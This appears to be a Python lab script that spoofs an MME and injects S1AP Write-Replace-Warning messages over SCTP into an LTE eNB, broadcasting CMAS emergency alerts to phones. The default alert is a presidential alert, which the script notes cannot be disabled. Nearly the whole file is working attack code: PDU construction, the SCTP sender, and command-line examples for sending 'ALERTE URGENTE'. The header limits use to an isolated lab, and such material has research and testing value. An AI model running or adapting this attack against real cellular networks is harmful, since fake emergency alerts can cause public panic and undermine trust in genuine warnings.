#!/usr/bin/env python3
"""
F2G CMAS Lab - Direct S1AP Write-Replace-Warning Injection
===========================================================

Ce script envoie un vrai message S1AP Write-Replace-Warning directement
à l'eNB via SCTP, en se faisant passer pour le MME.

IMPORTANT: L'eNB doit accepter la connexion S1AP de ce script.
           Utiliser uniquement en environnement de lab isolé.

Usage:
    python3 inject_write_replace_warning.py --enb 172.22.0.1:36412
    
Requires: pysctp (pip install pysctp)
"""

import argparse
import struct
import socket
import time
from datetime import datetime

try:
    import sctp
    HAS_SCTP = True
except ImportError:
    HAS_SCTP = False
    print("⚠️ pysctp not found. Install with: pip install pysctp")

# ============================================================================
# S1AP Constants (3GPP TS 36.413)
# ============================================================================

# Procedure Codes
S1AP_PROC_WRITE_REPLACE_WARNING = 36
S1AP_PROC_KILL = 37

# Criticality
CRITICALITY_REJECT = 0
CRITICALITY_IGNORE = 1
CRITICALITY_NOTIFY = 2

# IE IDs
IE_MESSAGE_IDENTIFIER = 111
IE_SERIAL_NUMBER = 139
IE_WARNING_AREA_LIST = 122
IE_REPETITION_PERIOD = 138
IE_NUMBER_OF_BROADCAST_REQUEST = 112
IE_WARNING_TYPE = 123
IE_DATA_CODING_SCHEME = 53
IE_WARNING_MESSAGE_CONTENTS = 121

# CMAS Message IDs (3GPP TS 23.041)
CMAS_IDS = {
    'presidential': 0x1112,   # 4370 - Cannot be disabled
    'extreme': 0x1113,        # 4371
    'severe': 0x1115,         # 4373
    'amber': 0x111B,          # 4379
    'test': 0x111C,           # 4380 - Required Monthly Test
    'exercise': 0x111D,       # 4381
}

# ============================================================================
# ASN.1 PER Encoding Helpers
# ============================================================================

def encode_per_length(length):
    """Encode length in PER format"""
    if length < 128:
        return bytes([length])
    elif length < 16384:
        return bytes([0x80 | (length >> 8), length & 0xFF])
    else:
        raise ValueError(f"Length {length} too large")

def encode_plmn(mcc, mnc):
    """Encode PLMN ID (3GPP TS 24.008)"""
    mcc_str = str(mcc).zfill(3)
    mnc_str = str(mnc).zfill(2)
    
    return bytes([
        (int(mcc_str[1]) << 4) | int(mcc_str[0]),
        0xF0 | int(mcc_str[2]),  # 0xF for 2-digit MNC
        (int(mnc_str[1]) << 4) | int(mnc_str[0])
    ])

def encode_tai(mcc, mnc, tac):
    """Encode Tracking Area Identity"""
    plmn = encode_plmn(mcc, mnc)
    return plmn + struct.pack('>H', tac)

def gsm7_encode(text):
    """Simple GSM 7-bit encoding (ASCII subset)"""
    # For simplicity, use ASCII - real GSM 7-bit has different character set
    return text.encode('ascii', errors='replace')

# ============================================================================
# S1AP Message Builder
# ============================================================================

def build_s1ap_ie(ie_id, criticality, value):
    """Build a single S1AP Information Element"""
    ie = bytearray()
    
    # Protocol IE ID (2 bytes)
    ie.extend(struct.pack('>H', ie_id))
    
    # Criticality (1 byte in practice for PER)
    ie.append(criticality << 6)
    
    # Value length and value
    ie.extend(encode_per_length(len(value)))
    ie.extend(value)
    
    return bytes(ie)

def build_write_replace_warning_request(
    message_id=0x1112,
    serial_number=0xC001,
    tac_list=None,
    repetition_period=5,
    number_of_broadcasts=10,
    warning_message="F2G CMAS TEST"
):
    """
    Build S1AP Write-Replace-Warning-Request message
    
    Reference: 3GPP TS 36.413 Section 9.1.13.1
    """
    
    if tac_list is None:
        tac_list = [1]  # Default TAC
    
    ies = bytearray()
    ie_count = 0
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Message Identifier (Mandatory)
    # ─────────────────────────────────────────────────────────────────
    msg_id_value = struct.pack('>H', message_id)
    ies.extend(build_s1ap_ie(IE_MESSAGE_IDENTIFIER, CRITICALITY_REJECT, msg_id_value))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Serial Number (Mandatory)
    # ─────────────────────────────────────────────────────────────────
    serial_value = struct.pack('>H', serial_number)
    ies.extend(build_s1ap_ie(IE_SERIAL_NUMBER, CRITICALITY_REJECT, serial_value))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Warning Area List (Optional but needed for targeting)
    # Encoding: TAI List
    # ─────────────────────────────────────────────────────────────────
    tai_list_value = bytearray()
    # Choice: TAI List (index 1 in the CHOICE)
    tai_list_value.append(0x00)  # CHOICE index for TAI list
    tai_list_value.append(len(tac_list) - 1)  # Number of TAIs - 1 (0-indexed)
    for tac in tac_list:
        tai_list_value.extend(encode_tai(1, 1, tac))  # MCC=001, MNC=01
    ies.extend(build_s1ap_ie(IE_WARNING_AREA_LIST, CRITICALITY_IGNORE, bytes(tai_list_value)))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Repetition Period (Mandatory)
    # ─────────────────────────────────────────────────────────────────
    rep_value = struct.pack('>H', repetition_period)
    ies.extend(build_s1ap_ie(IE_REPETITION_PERIOD, CRITICALITY_REJECT, rep_value))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Number of Broadcast Requested (Mandatory)
    # ─────────────────────────────────────────────────────────────────
    num_value = struct.pack('>H', number_of_broadcasts)
    ies.extend(build_s1ap_ie(IE_NUMBER_OF_BROADCAST_REQUEST, CRITICALITY_REJECT, num_value))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Data Coding Scheme (Optional)
    # 0x01 = GSM 7-bit default alphabet
    # ─────────────────────────────────────────────────────────────────
    dcs_value = bytes([0x01])
    ies.extend(build_s1ap_ie(IE_DATA_CODING_SCHEME, CRITICALITY_IGNORE, dcs_value))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # IE: Warning Message Contents (Optional but this IS the alert!)
    # ─────────────────────────────────────────────────────────────────
    # Format: Number of pages (1 byte) + Page data
    msg_encoded = gsm7_encode(warning_message)[:93]  # Max 93 chars per page
    msg_content = bytes([1]) + msg_encoded  # 1 page
    ies.extend(build_s1ap_ie(IE_WARNING_MESSAGE_CONTENTS, CRITICALITY_IGNORE, msg_content))
    ie_count += 1
    
    # ─────────────────────────────────────────────────────────────────
    # Build the full S1AP-PDU
    # ─────────────────────────────────────────────────────────────────
    
    # WriteReplaceWarningRequest container
    pdu_value = bytearray()
    pdu_value.extend(struct.pack('>H', ie_count - 1))  # protocolIEs count - 1
    pdu_value.extend(ies)
    
    # InitiatingMessage
    initiating_msg = bytearray()
    initiating_msg.append(S1AP_PROC_WRITE_REPLACE_WARNING)  # procedureCode
    initiating_msg.append(CRITICALITY_REJECT << 6)  # criticality
    initiating_msg.extend(encode_per_length(len(pdu_value)))
    initiating_msg.extend(pdu_value)
    
    # S1AP-PDU (CHOICE: initiatingMessage = 0)
    s1ap_pdu = bytearray()
    s1ap_pdu.append(0x00)  # CHOICE index: initiatingMessage
    s1ap_pdu.extend(initiating_msg)
    
    return bytes(s1ap_pdu)

# ============================================================================
# SCTP Sender
# ============================================================================

def send_via_sctp(host, port, data, ppid=18):
    """
    Send data via SCTP
    PPID 18 = S1AP
    """
    if not HAS_SCTP:
        print("❌ pysctp not available")
        return False
    
    try:
        # Create SCTP socket
        sk = sctp.sctpsocket_tcp(socket.AF_INET)
        sk.settimeout(10)
        
        print(f"📡 Connecting to {host}:{port}...")
        sk.connect((host, port))
        
        # Send with S1AP PPID
        print(f"📤 Sending {len(data)} bytes (PPID={ppid})...")
        sk.sctp_send(data, ppid=ppid)
        
        print("✅ Message sent!")
        
        # Try to receive response
        try:
            sk.settimeout(3)
            response = sk.recv(4096)
            if response:
                print(f"📥 Response: {len(response)} bytes")
                print(f"   Hex: {response.hex()}")
        except socket.timeout:
            print("⏳ No response (timeout)")
        
        sk.close()
        return True
        
    except Exception as e:
        print(f"❌ SCTP error: {e}")
        return False

# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='F2G CMAS - Direct S1AP Write-Replace-Warning Injection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send Presidential Alert to TAC 1
  python3 %(prog)s --host 172.22.0.9 --type presidential --message "ALERTE URGENTE"
  
  # Send test alert
  python3 %(prog)s --host 172.22.0.9 --type test --tac 1 2 --message "Test CMAS"
        """
    )
    
    parser.add_argument('--host', '-H', default='172.22.0.9',
                        help='MME or eNB IP address (default: 172.22.0.9)')
    parser.add_argument('--port', '-p', type=int, default=36412,
                        help='S1AP port (default: 36412)')
    parser.add_argument('--type', '-t', choices=CMAS_IDS.keys(), default='presidential',
                        help='Alert type (default: presidential)')
    parser.add_argument('--tac', '-T', type=int, nargs='+', default=[1],
                        help='Target TAC(s) (default: 1)')
    parser.add_argument('--message', '-m', default='F2G CMAS ALERT - Ceci est une alerte de test',
                        help='Warning message')
    parser.add_argument('--repeat', '-r', type=int, default=5,
                        help='Repetition period in seconds')
    parser.add_argument('--count', '-c', type=int, default=10,
                        help='Number of broadcasts')
    parser.add_argument('--dry-run', '-n', action='store_true',
                        help='Show packet without sending')
    
    args = parser.parse_args()
    
    # Generate serial number with timestamp
    now = datetime.now()
    serial = ((now.hour << 11) | (now.minute << 5) | (now.second >> 1)) & 0xFFFF
    
    message_id = CMAS_IDS[args.type]
    
    print("=" * 70)
    print("  F2G CMAS Lab - S1AP Write-Replace-Warning Injection")
    print("=" * 70)
    print()
    print(f"  Target:          {args.host}:{args.port}")
    print(f"  Alert Type:      {args.type.upper()}")
    print(f"  Message ID:      0x{message_id:04X} ({message_id})")
    print(f"  Serial Number:   0x{serial:04X}")
    print(f"  Target TAC(s):   {args.tac}")
    print(f"  Repetition:      {args.repeat}s x {args.count}")
    print(f"  Message:         {args.message[:50]}...")
    print()
    
    # Build the S1AP message
    s1ap_pdu = build_write_replace_warning_request(
        message_id=message_id,
        serial_number=serial,
        tac_list=args.tac,
        repetition_period=args.repeat,
        number_of_broadcasts=args.count,
        warning_message=args.message
    )
    
    print("S1AP PDU (hex):")
    print("-" * 40)
    for i in range(0, len(s1ap_pdu), 16):
        chunk = s1ap_pdu[i:i+16]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        print(f"  {i:04x}: {hex_str}")
    print()
    
    if args.dry_run:
        print("🔍 Dry run - packet not sent")
        return
    
    # Send via SCTP
    print("=" * 70)
    success = send_via_sctp(args.host, args.port, s1ap_pdu)
    
    if success:
        print()
        print("=" * 70)
        print("  ✅ Write-Replace-Warning-Request SENT!")
        print("=" * 70)
        print()
        print("  📱 Les téléphones devraient recevoir l'alerte!")
        print()
        print("  Pour vérifier dans Wireshark:")
        print("    Filter: s1ap.procedureCode == 36")
    else:
        print()
        print("❌ Échec de l'envoi. Vérifiez la connectivité SCTP.")

if __name__ == '__main__':
    main()
